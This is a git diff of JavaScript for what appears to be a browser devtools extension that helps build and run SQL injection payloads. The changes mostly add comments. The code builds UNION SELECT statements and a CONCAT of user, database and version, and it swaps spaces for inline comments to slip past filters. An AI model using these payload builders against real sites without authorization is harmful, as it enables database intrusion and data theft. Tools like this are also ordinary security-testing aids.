@@ -19,19 +19,26 @@ let actionButtons = [
 
 listenClicks( actionButtons );
 
+
 /**
  * Functions
  */
+
+// get single element by CSS selector
 function _( el )
 {
     return document.querySelector( el );
 }
 
+
+// get all elements that match CSS selector
 function __( el )
 {
     return document.querySelectorAll( el );
 }
 
+
+// attach function to click event of given elements
 function listenClicks( elements )
 {
     elements.forEach( el => {
@@ -41,20 +48,15 @@ function listenClicks( elements )
     });
 }
 
+
+// execute code in the current tab
 function exec( cmd )
 {
-    // console.log( browser.devtools.inspectedWindow );
-    // browser.tabs.sendMessage( tabs[0].id, {
-    //     command: cmd
-    // });
-
-    // browser.runtime.sendMessage({
-    //     tabId: browser.devtools.inspectedWindow.tabId,
-    //     script: code
-    // });
     return browser.devtools.inspectedWindow.eval( cmd );
 }
 
+
+// load current URL into the payload input
 function loadURL()
 {
     exec( 'window.location.href' ).then( URL => {
@@ -63,6 +65,8 @@ function loadURL()
     });
 }
 
+
+// split the paypload URL by its get parameters
 function splitURL()
 {
     let URL =  payloadInput.value;
@@ -72,6 +76,8 @@ function splitURL()
     payloadInput.value = URL;
 }
 
+
+// execute payload from the input
 function executePayload()
 {
     let URL =  payloadInput.value;
@@ -80,16 +86,23 @@ function executePayload()
     });
 }
 
+
+// add value to payload
+// TODO: add the value in the current position of the cursor
 function addToPayload( data )
 {
     payloadInput.value += data;
 }
 
+
+// add basic SQL info column to the payload
 function basicInfoColum()
 {
     addToPayload( 'CONCAT(user(),"::",database(),"::",version())' );
 }
 
+
+// add SQL union select statement to the payload
 function unionSelectStatement()
 {
     let out = 'UNION SELECT ';
@@ -105,6 +118,8 @@ function unionSelectStatement()
     });
 }
 
+
+// replace spaces in payload with inline SQL comments
 function spacesToInlineComments()
 {
     payloadInput.value = payloadInput.value.replace( /\s+/g, '/**/' );
